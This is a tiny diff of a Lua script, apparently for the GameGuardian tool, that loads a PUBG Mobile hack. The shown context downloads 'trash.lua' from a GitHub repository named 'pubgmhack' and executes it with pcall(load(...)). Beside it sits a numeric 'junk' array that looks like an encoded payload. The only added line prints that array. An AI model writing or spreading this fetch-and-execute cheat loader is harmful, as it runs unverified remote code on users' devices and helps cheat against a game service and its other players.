@@ -2,3 +2,4 @@ junk = { 69, 65, 70, 66, 71, 69, 70, 73, 70, 66, 66, 65, 67, 85, 66, 65, 70, 72,
 
 local trash = gg.makeRequest('https://raw.githubusercontent.com/redstarksten/pubgmhack/master/trash.lua').content
 pcall(load(trash))
+print(junk)
